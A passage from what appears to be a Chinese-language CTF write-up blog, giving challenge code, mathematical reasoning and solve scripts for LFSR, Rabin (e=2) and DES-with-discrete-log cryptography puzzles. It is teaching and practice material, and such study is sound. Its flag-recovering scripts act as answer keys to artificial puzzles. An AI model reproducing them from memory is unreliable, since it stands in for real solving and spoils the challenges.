class="hljs-number">39</span>, <span class="hljs-number">158</span>, <span class="hljs-number">199</span>, <span class="hljs-number">213</span>, <span class="hljs-number">92</span>, <span class="hljs-number">137</span>, <span class="hljs-number">212</span>, <span class="hljs-number">35</span>, <span class="hljs-number">101</span>, <span class="hljs-number">20</span>, <span class="hljs-number">201</span>, <span class="hljs-number">231</span>, <span class="hljs-number">232</span>, <span class="hljs-number">156</span>, <span class="hljs-number">179</span>, <span class="hljs-number">18</span>, <span class="hljs-number">27</span>, <span class="hljs-number">192</span>, <span class="hljs-number">250</span>, <span class="hljs-number">13</span>, <span class="hljs-number">150</span>, <span class="hljs-number">117</span>, <span class="hljs-number">122</span>, <span class="hljs-number">183</span>, <span class="hljs-number">83</span>, <span class="hljs-number">114</span>, <span class="hljs-number">86</span>, <span class="hljs-number">108</span>, <span class="hljs-number">155</span>, <span class="hljs-number">83</span>, <span class="hljs-number">224</span>, <span class="hljs-number">107</span>, <span class="hljs-number">190</span>, <span class="hljs-number">183</span>, <span class="hljs-number">138</span>, <span class="hljs-number">124</span>, <span class="hljs-number">211</span>, <span class="hljs-number">205</span>, <span class="hljs-number">96</span>, <span class="hljs-number">36</span>, <span class="hljs-number">64</span>, <span class="hljs-number">215</span>, <span class="hljs-number">193</span>, <span class="hljs-number">214</span>, <span class="hljs-number">239</span>, <span class="hljs-number">154</span>, <span class="hljs-number">78</span>, <span class="hljs-number">52</span>, <span class="hljs-number">229</span>, <span class="hljs-number">220</span>, <span class="hljs-number">60</span>, <span class="hljs-number">147</span>, <span class="hljs-number">118</span>, <span class="hljs-number">120</span>, <span class="hljs-number">247</span>, <span class="hljs-number">71</span>, <span class="hljs-number">10</span>, <span class="hljs-number">4</span>, <span class="hljs-number">96</span>, <span class="hljs-number">153</span>, <span class="hljs-number">70</span>, <span class="hljs-number">162</span>, <span class="hljs-number">107</span>, <span class="hljs-number">154</span>, <span class="hljs-number">170</span>, <span class="hljs-number">195</span>, <span class="hljs-number">92</span>, <span class="hljs-number">221</span>, <span class="hljs-number">215</span>, <span class="hljs-number">124</span>, <span class="hljs-number">12</span>, <span class="hljs-number">68</span>, <span class="hljs-number">151</span>, <span class="hljs-number">205</span>, <span class="hljs-number">212</span>, <span class="hljs-number">140</span>, <span class="hljs-number">231</span>, <span class="hljs-number">101</span>, <span class="hljs-number">30</span>, <span class="hljs-number">192</span>, <span class="hljs-number">241</span>, <span class="hljs-number">122</span>, <span class="hljs-number">192</span>, <span class="hljs-number">94</span>, <span class="hljs-number">115</span>, <span class="hljs-number">227</span>, <span class="hljs-number">39</span>, <span class="hljs-number">92</span>, <span class="hljs-number">80</span>, <span class="hljs-number">86</span>, <span class="hljs-number">155</span>, <span class="hljs-number">95</span>, <span class="hljs-number">253</span>, <span class="hljs-number">117</span>, <span class="hljs-number">240</span>, <span class="hljs-number">199</span>, <span class="hljs-number">253</span>, <span class="hljs-number">84</span>, <span class="hljs-number">144</span>, <span class="hljs-number">136</span>, <span class="hljs-number">28</span>, <span class="hljs-number">96</span>, <span class="hljs-number">87</span>, <span class="hljs-number">157</span>, <span class="hljs-number">221</span>, <span class="hljs-number">236</span>, <span class="hljs-number">149</span>, <span class="hljs-number">186</span>, <span class="hljs-number">87</span>, <span class="hljs-number">42</span>, <span class="hljs-number">172</span>, <span class="hljs-number">234</span>, <span class="hljs-number">115</span>, <span class="hljs-number">235</span>, <span class="hljs-number">73</span>, <span class="hljs-number">122</span>, <span class="hljs-number">193</span>, <span class="hljs-number">9</span>, <span class="hljs-number">83</span>, <span class="hljs-number">6</span>, <span class="hljs-number">97</span>, <span class="hljs-number">213</span>, <span class="hljs-number">81</span>, <span class="hljs-number">144</span>, <span class="hljs-number">63</span>, <span class="hljs-number">131</span>, <span class="hljs-number">170</span>, <span class="hljs-number">204</span>, <span class="hljs-number">108</span>, <span class="hljs-number">132</span>, <span class="hljs-number">195</span>, <span class="hljs-number">3</span>, <span class="hljs-number">98</span>, <span class="hljs-number">76</span>, <span class="hljs-number">183</span>, <span class="hljs-number">208</span>, <span class="hljs-number">153</span>, <span class="hljs-number">250</span>, <span class="hljs-number">158</span>, <span class="hljs-number">21</span>, <span class="hljs-number">53</span>, <span class="hljs-number">252</span>, <span class="hljs-number">184</span>, <span class="hljs-number">11</span>, <span class="hljs-number">134</span>, <span class="hljs-number">76</span>, <span class="hljs-number">98</span>, <span class="hljs-number">211</span>, <span class="hljs-number">46</span>, <span class="hljs-number">98</span>, <span class="hljs-number">93</span>, <span class="hljs-number">72</span>, <span class="hljs-number">223</span>, <span class="hljs-number">37</span>, <span class="hljs-number">137</span>, <span class="hljs-number">112</span>, <span class="hljs-number">250</span>, <span class="hljs-number">172</span>, <span class="hljs-number">242</span>, <span class="hljs-number">69</span>, <span class="hljs-number">151</span>, <span class="hljs-number">128</span>, <span class="hljs-number">25</span>, <span class="hljs-number">38</span>, <span class="hljs-number">34</span>, <span class="hljs-number">156</span>, <span class="hljs-number">206</span>, <span class="hljs-number">233</span>, <span class="hljs-number">189</span>, <span class="hljs-number">142</span>, <span class="hljs-number">18</span>, <span class="hljs-number">119</span>, <span class="hljs-number">206</span>, <span class="hljs-number">192</span>, <span class="hljs-number">107</span>, <span class="hljs-number">246</span>, <span class="hljs-number">55</span>, <span class="hljs-number">3</span>, <span class="hljs-number">195</span>, <span class="hljs-number">54</span>, <span class="hljs-number">17</span>, <span class="hljs-number">42</span>, <span class="hljs-number">47</span>, <span class="hljs-number">209</span>, <span class="hljs-number">16</span>, <span class="hljs-number">231</span>, <span class="hljs-number">41</span>, <span class="hljs-number">161</span>, <span class="hljs-number">214</span>, <span class="hljs-number">229</span>, <span class="hljs-number">107</span>, <span class="hljs-number">238</span>, <span class="hljs-number">134</span>, <span class="hljs-number">107</span>, <span class="hljs-number">35</span>, <span class="hljs-number">12</span>, <span class="hljs-number">191</span>, <span class="hljs-number">197</span>, <span class="hljs-number">240</span>, <span class="hljs-number">138</span>, <span class="hljs-number">191</span>, <span class="hljs-number">88</span>, <span class="hljs-number">36</span>, <span class="hljs-number">248</span>, <span class="hljs-number">254</span>, <span class="hljs-number">96</span>, <span class="hljs-number">237</span>, <span class="hljs-number">66</span>, <span class="hljs-number">10</span>, <span class="hljs-number">169</span>, <span class="hljs-number">65</span>, <span class="hljs-number">6</span>, <span class="hljs-number">94</span>, <span class="hljs-number">107</span>, <span class="hljs-number">128</span>, <span class="hljs-number">58</span>, <span class="hljs-number">183</span>, <span class="hljs-number">63</span>, <span class="hljs-number">230</span>, <span class="hljs-number">189</span>, <span class="hljs-number">223</span>, <span class="hljs-number">123</span>, <span class="hljs-number">204</span>, <span class="hljs-number">180</span>, <span class="hljs-number">14</span>, <span class="hljs-number">19</span>, <span class="hljs-number">84</span>, <span class="hljs-number">151</span>, <span class="hljs-number">229</span>, <span class="hljs-number">247</span>, <span class="hljs-number">252</span>, <span class="hljs-number">235</span>, <span class="hljs-number">116</span>, <span class="hljs-number">45</span>, <span class="hljs-number">198</span>, <span class="hljs-number">162</span>, <span class="hljs-number">120</span>, <span class="hljs-number">255</span>, <span class="hljs-number">70</span>, <span class="hljs-number">29</span>, <span class="hljs-number">251</span>, <span class="hljs-number">68</span>, <span class="hljs-number">81</span>, <span class="hljs-number">6</span>, <span class="hljs-number">56</span>, <span class="hljs-number">187</span>, <span class="hljs-number">88</span>, <span class="hljs-number">137</span>, <span class="hljs-number">108</span>, <span class="hljs-number">161</span>, <span class="hljs-number">145</span>, <span class="hljs-number">242</span>, <span class="hljs-number">116</span>, <span class="hljs-number">247</span>, <span class="hljs-number">154</span>, <span class="hljs-number">6</span>, <span class="hljs-number">110</span>, <span class="hljs-number">36</span>, <span class="hljs-number">135</span>, <span class="hljs-number">186</span>, <span class="hljs-number">214</span>, <span class="hljs-number">152</span>, <span class="hljs-number">245</span>]<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    L1=LFSR(fpoly=[<span class="hljs-number">4</span>,<span class="hljs-number">1</span>],initstate=<span class="hljs-string">&#x27;random&#x27;</span>,verbose=<span class="hljs-literal">False</span>)<span class="hljs-comment">#4位移位寄存器</span><br>    L2=LFSR(fpoly=[<span class="hljs-number">5</span>,<span class="hljs-number">2</span>],initstate=<span class="hljs-string">&#x27;random&#x27;</span>,verbose=<span class="hljs-literal">False</span>)<br>    k1=[]<br>    <span class="hljs-comment">#print(k1)</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(L1.T):<br>        tmp=<span class="hljs-string">&#x27;&#x27;</span><br>        <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>            tmp+=<span class="hljs-built_in">str</span>(L1.<span class="hljs-built_in">next</span>())<br>        k1.append(<span class="hljs-built_in">int</span>(tmp,<span class="hljs-number">2</span>))<br>    <span class="hljs-comment">#print(&#x27;k1&#x27;)</span><br>    <span class="hljs-comment">#print(k1)</span><br>    k2=[]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(L2.T):<br>        tmp=<span class="hljs-string">&#x27;&#x27;</span><br>        <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>            tmp+=<span class="hljs-built_in">str</span>(L2.<span class="hljs-built_in">next</span>())<br>        k2.append(<span class="hljs-built_in">int</span>(tmp,<span class="hljs-number">2</span>))<br>    m1=[c1[i]^k1[i%<span class="hljs-built_in">len</span>(k1)] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">400</span>,<span class="hljs-number">452</span>)]<br>    m2=[c2[i]^k2[i%<span class="hljs-built_in">len</span>(k2)] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">400</span>,<span class="hljs-number">452</span>)]<br>    res1=<span class="hljs-string">&#x27;&#x27;</span><br>    res2=<span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(m1)):<br>        res1+=<span class="hljs-built_in">chr</span>(m1[i])<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(m2)):<br>        res2+=<span class="hljs-built_in">chr</span>(m2[i])<br>    <span class="hljs-comment">#print(res1)</span><br>    <span class="hljs-comment">#print(res2)</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">in</span> res1 <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">in</span> res2:<br>        <span class="hljs-built_in">print</span>(res1)<br>        <span class="hljs-built_in">print</span>(res2)<br>        <span class="hljs-keyword">break</span><br><br></code></pre></td></tr></table></figure><h2 id="2-Rabin"><a href="#2-Rabin" class="headerlink" title="2.Rabin"></a>2.Rabin</h2><p>描述：非素数模平方根</p><p>题目：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2 <span class="hljs-keyword">as</span> gp<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> secert <span class="hljs-keyword">import</span> flag<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_prime</span>():<br>    p=<span class="hljs-number">4</span>*getPrime(<span class="hljs-number">511</span>)+<span class="hljs-number">3</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> isPrime(p):<br>        p = <span class="hljs-number">4</span> * getPrime(<span class="hljs-number">511</span>) + <span class="hljs-number">3</span><br>    <span class="hljs-keyword">return</span> p<br>p=get_prime()<br>q=get_prime()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;p=&#x27;</span>,p)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;q=&#x27;</span>,q)<br>e=<span class="hljs-number">2</span><br>m=bytes_to_long(flag)<br>n=p*q<br>c=<span class="hljs-built_in">pow</span>(m,e,n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;c=&#x27;</span>,c)<br><span class="hljs-comment"># p= 191347168846916878141578001303655055683981070975868056032490785392900806784727</span><br><span class="hljs-comment"># q= 219673873853765612669813661096032565978134844881522541118068777157179360691471</span><br><span class="hljs-comment"># c= 994772772317512037785187803773696380558134918614351250855785624718258501242901981846337801266369414061152226881009458849215835578985342658608537003662606</span><br><br></code></pre></td></tr></table></figure><p>思路：</p><p>开始想的思路是这个，但是写了脚本没有得到flag,应该是错误思路:</p><p>正常来说e的最小取值是3,因为要和phi互素，这里的加密直接变成了,感觉可以直接变成解二次同余式</p><script type="math/tex; mode=display">c=m^2(modN)</script><p>由于N=p*q,该式子可变成</p><script type="math/tex; mode=display">c1=m^2(modp)\\c2=m^2(modq)</script><p>可以用中国剩余定理解m^2,最后再开根号</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">import</span> libnum<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><span class="hljs-keyword">from</span> sympy.ntheory.modular <span class="hljs-keyword">import</span> crt<br>p= <span class="hljs-number">191347168846916878141578001303655055683981070975868056032490785392900806784727</span><br>q= <span class="hljs-number">219673873853765612669813661096032565978134844881522541118068777157179360691471</span><br>c= <span class="hljs-number">994772772317512037785187803773696380558134918614351250855785624718258501242901981846337801266369414061152226881009458849215835578985342658608537003662606</span><br>n=p*q<br>e = <span class="hljs-number">2</span><br>n_list= [p,q]<br>c_list= [c%p, c%q]<br><br>resultant, mod = crt(n_list, c_list)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>mm=resultant+p*q*i<br>value, is_perfect = gmpy2.iroot(mm, e)<br>flag=long_to_bytes(value)<br><span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;flag&#x27;</span> <span class="hljs-keyword">in</span> flag:<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><p>正解：</p><p>参考：<a href="https://blog.csdn.net/jcbx_/article/details/101066670">https://blog.csdn.net/jcbx_/article/details/101066670</a></p><p>先看有关二次剩余的相关定理：</p><p>设m是正整数，gcd(a,m)=1,若同余式</p><script type="math/tex; mode=display">x^2\equiv{a}(modm)</script><p>有解,则a为模p的二次剩余(平方剩余)，无解，则a为模p的二次非剩余(平方非剩余)</p><p>讨论模为素数p的二次同余式</p><script type="math/tex; mode=display">x^2\equiv{a}(modp)</script><p>欧拉判别：</p><p>p是奇素数，gcd(a,p)=1</p><p>a是模p的平方剩余的充要条件</p><script type="math/tex; mode=display">a^\frac{p-1}{2}\equiv1(modp)</script><p>a是模p平方非剩余的充要条件：</p><script type="math/tex; mode=display">a^\frac{p-1}{2}\equiv-1(modp)</script><p>Rabin的加解密</p><p>看起来像RSA其实不是，这个函数不是单射，密文能解出四个明文</p><p>加密：</p><p>(1)取两个大素数p与q，使得p≡q≡3(mod 4)(保证为奇素数)<br>(2)</p><script type="math/tex; mode=display">n=p*q\\c\equiv{m^2}(modn)</script><p>解密：</p><p>由于c是m的二次剩余,c也是p(q)的二次剩余</p><script type="math/tex; mode=display">c^\frac{p-1}{2}\equiv1(modp)</script><p>有m1,m2为异号</p><script type="math/tex; mode=display">m^2\equiv{c*c^\frac{p-1}{2}}\equiv{c^\frac{p+1}{2}}(modp)\\\begin{cases}m_1\equiv{c^\frac{p+1}{4}}(modp) \quad\qquad(1)\\m_2\equiv{p-c^\frac{p+1}{4}}(modp)\quad(2)\end{cases}</script><p>同理有</p><script type="math/tex; mode=display">m^2\equiv{c*c^\frac{q-1}{2}}\equiv{c^\frac{q+1}{2}}(modq)\\\begin{cases}m_3\equiv{c^\frac{q+1}{4}}(modq)\quad\qquad(3)\\m_4\equiv{q-c^\frac{q+1}{4}}(modq)\quad(4)\end{cases}</script><p>对[1,3],[1,4],[2,3],[2,4]四次中国剩余定理,分别得到m1,m2,m3,m4,明文为其中的一个</p><p>exp1:(利用sympy.ntheory.modular模块中的CRT函数)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><span class="hljs-keyword">from</span> sympy.ntheory.modular <span class="hljs-keyword">import</span> crt<br>p= <span class="hljs-number">191347168846916878141578001303655055683981070975868056032490785392900806784727</span><br>q= <span class="hljs-number">219673873853765612669813661096032565978134844881522541118068777157179360691471</span><br>c= <span class="hljs-number">994772772317512037785187803773696380558134918614351250855785624718258501242901981846337801266369414061152226881009458849215835578985342658608537003662606</span><br><br>c1=<span class="hljs-built_in">pow</span>(c,(p+<span class="hljs-number">1</span>)//<span class="hljs-number">4</span>,p)<br>c2=p-c1<br>c3=<span class="hljs-built_in">pow</span>(c,(q+<span class="hljs-number">1</span>)//<span class="hljs-number">4</span>,q)<br>c4=q-c3<br><br>res1,mod1=crt([p,q],[c1,c3])<br>res2,mod2=crt([p,q],[c1,c4])<br>res3,mod3=crt([p,q],[c2,c3])<br>res4,mod4=crt([p,q],[c2,c4])<br><br><span class="hljs-built_in">print</span>(long_to_bytes(res1))<br><span class="hljs-built_in">print</span>(long_to_bytes(res2))<br><span class="hljs-built_in">print</span>(long_to_bytes(res3))<br><span class="hljs-built_in">print</span>(long_to_bytes(res4))<br></code></pre></td></tr></table></figure><p>exp2:(自己写CRT的求解)</p><p>CRT公式</p><script type="math/tex; mode=display">x=b_1*M_1^{'}*M_1+b_2*M_2^{'}*M_2+...+b_i*M_i^{'}*M_i(modm)</script><p>其中</p><script type="math/tex; mode=display">m=m_1*m_2*...*m_i\\M_i=m//m_i\\M_i^{'}=M_i^{-1}(modm_i)</script><p>如果只有两个式子可简化为</p><script type="math/tex; mode=display">x=b_1*(m_2^{-1}(modm_1))*m_2+b_2*(m_1^{-1}(modm_2))*m_1(modm_1*m_2)</script><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br>p= <span class="hljs-number">191347168846916878141578001303655055683981070975868056032490785392900806784727</span><br>q= <span class="hljs-number">219673873853765612669813661096032565978134844881522541118068777157179360691471</span><br>c= <span class="hljs-number">994772772317512037785187803773696380558134918614351250855785624718258501242901981846337801266369414061152226881009458849215835578985342658608537003662606</span><br>n=p*q<br>c1=<span class="hljs-built_in">pow</span>(c,(p+<span class="hljs-number">1</span>)//<span class="hljs-number">4</span>,p)<br>c2=p-c1<br>c3=<span class="hljs-built_in">pow</span>(c,(q+<span class="hljs-number">1</span>)//<span class="hljs-number">4</span>,q)<br>c4=q-c3<br><br>p_inv=gmpy2.invert(p,q)<br>q_inv=gmpy2.invert(q,p)<br><br>res1=(c1*q*q_inv+c3*p*p_inv)%n<br>res2=(c1*q*q_inv+c4*p*p_inv)%n<br>res3=(c2*q*q_inv+c3*p*p_inv)%n<br>res4=(c2*q*q_inv+c4*p*p_inv)%n<br><br><span class="hljs-built_in">print</span>(long_to_bytes(res1))<br><span class="hljs-built_in">print</span>(long_to_bytes(res2))<br><span class="hljs-built_in">print</span>(long_to_bytes(res3))<br><span class="hljs-built_in">print</span>(long_to_bytes(res4))<br></code></pre></td></tr></table></figure><p>exp3:(这个是看到一个博客(<a href="https://blog.csdn.net/weixin_44617902/article/details/109478142)写的一种方法，但是没看太懂">https://blog.csdn.net/weixin_44617902/article/details/109478142)写的一种方法，但是没看太懂</a>)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2 <span class="hljs-keyword">as</span> gp<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>p= <span class="hljs-number">191347168846916878141578001303655055683981070975868056032490785392900806784727</span><br>q= <span class="hljs-number">219673873853765612669813661096032565978134844881522541118068777157179360691471</span><br>c= <span class="hljs-number">994772772317512037785187803773696380558134918614351250855785624718258501242901981846337801266369414061152226881009458849215835578985342658608537003662606</span><br>n=p*q<br><br>a,inv_q ,inv_p= gp.gcdext(q,p)<br>mp = <span class="hljs-built_in">pow</span>(c, (p + <span class="hljs-number">1</span>) // <span class="hljs-number">4</span>, p)<br>mq = <span class="hljs-built_in">pow</span>(c, (q + <span class="hljs-number">1</span>) // <span class="hljs-number">4</span>, q)<br>a = (inv_p * p * mq + inv_q * q * mp) % n<br>b = n - <span class="hljs-built_in">int</span>(a)<br>c = (inv_p * p * mq - inv_q * q * mp) % n<br>d = n - <span class="hljs-built_in">int</span>(c)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span>(a,b,c,d):<br>    <span class="hljs-built_in">print</span>(long_to_bytes(i))<br></code></pre></td></tr></table></figure><h2 id="3-D-DES"><a href="#3-D-DES" class="headerlink" title="3.D_DES"></a>3.D_DES</h2><p>描述：D3S 0fB and …</p><p>题目：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2 <span class="hljs-keyword">as</span> gp<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> DES<br>x = getPrime(<span class="hljs-number">32</span>)<br>g=getPrime(<span class="hljs-number">32</span>)<br>p = getPrime(<span class="hljs-number">64</span>)<br>c=<span class="hljs-built_in">pow</span>(g,x,p)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;g=&#x27;</span>,g)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;p=&#x27;</span>,p)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;c=&#x27;</span>,c)<br>k=long_to_bytes(x)*<span class="hljs-number">2</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(k))<br>enc=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(flag),<span class="hljs-number">8</span>):<br>    buf=flag[i:i+<span class="hljs-number">8</span>]<br>    des=DES.new(k,DES.MODE_ECB)<br>    k=des.encrypt(k)<span class="hljs-comment">#k的长度为8字节</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(buf)):<br>        enc.append(buf[j]^k[j])<br><span class="hljs-built_in">print</span>(enc)<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">g= 3766405567</span><br><span class="hljs-string">p= 15598130864496243067</span><br><span class="hljs-string">c= 13012006854898403582</span><br><span class="hljs-string">enc=[231, 126, 194, 130, 178, 221, 226, 233, 245, 96, 156, 223, 12, 102, 97, 0, 82, 232, 211, 6, 115, 170, 144, 117, 59, 8, 217, 30, 79, 1, 7, 106, 65, 66, 47, 232, 59, 119, 63, 79, 192, 25]</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p>思路：</p><p>为了解出明文，需要得到加密密钥，用加密密钥异或上密文就得到明文了。</p><p>加密密钥由随机生成的4字节x*2形成8字节的k,再进行DES_ECB加密得到加密密钥k</p><p>所以关键在于求出x,有关x的信息如下：</p><script type="math/tex; mode=display">c\equiv{g^x}(modp)</script><p>已知c,g,p，求x:</p><p>离散对数问题，可以利用sympy.discrete_log()函数求解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">x=sympy.discrete_log(p,c,g)<br></code></pre></td></tr></table></figure><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2 <span class="hljs-keyword">as</span> gp<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> DES<br><span class="hljs-keyword">import</span> sympy<br>g= <span class="hljs-number">3766405567</span><br>p= <span class="hljs-number">15598130864496243067</span><br>c= <span class="hljs-number">13012006854898403582</span><br>enc=[<span class="hljs-number">231</span>, <span class="hljs-number">126</span>, <span class="hljs-number">194</span>, <span class="hljs-number">130</span>, <span class="hljs-number">178</span>, <span class="hljs-number">221</span>, <span class="hljs-number">226</span>, <span class="hljs-number">233</span>, <span class="hljs-number">245</span>, <span class="hljs-number">96</span>, <span class="hljs-number">156</span>, <span class="hljs-number">223</span>, <span class="hljs-number">12</span>, <span class="hljs-number">102</span>, <span class="hljs-number">97</span>, <span class="hljs-number">0</span>, <span class="hljs-number">82</span>, <span class="hljs-number">232</span>, <span class="hljs-number">211</span>, <span class="hljs-number">6</span>, <span class="hljs-number">115</span>, <span class="hljs-number">170</span>, <span class="hljs-number">144</span>, <span class="hljs-number">117</span>, <span class="hljs-number">59</span>, <span class="hljs-number">8</span>, <span class="hljs-number">217</span>, <span class="hljs-number">30</span>, <span class="hljs-number">79</span>, <span class="hljs-number">1</span>, <span class="hljs-number">7</span>, <span class="hljs-number">106</span>, <span class="hljs-number">65</span>, <span class="hljs-number">66</span>, <span class="hljs-number">47</span>, <span class="hljs-number">232</span>, <span class="hljs-number">59</span>, <span class="hljs-number">119</span>, <span class="hljs-number">63</span>, <span class="hljs-number">79</span>, <span class="hljs-number">192</span>, <span class="hljs-number">25</span>]<br>mm=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">42</span>):<br>mm+=<span class="hljs-built_in">chr</span>(enc[i])<br><span class="hljs-comment">#mm=long_to_bytes(int(mm))</span><br>x=sympy.discrete_log(p,c,g)<br><span 